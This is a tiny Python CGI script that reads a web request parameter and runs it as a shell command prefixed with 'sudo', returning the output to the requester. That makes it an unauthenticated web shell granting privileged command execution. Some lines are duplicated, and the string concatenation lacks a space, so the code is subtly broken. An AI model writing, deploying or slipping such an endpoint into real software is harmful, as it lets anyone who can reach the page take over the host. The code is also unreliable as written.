import cgi
import subprocess
import time

print("content-type: text/html")
print()

f=cgi.FieldStorage()
cmd = f.getvalue("x")


f = cgi.FieldStorage()
cmd = f.getvalue("x")

o = subprocess.getoutput("sudo" + cmd)
print(o)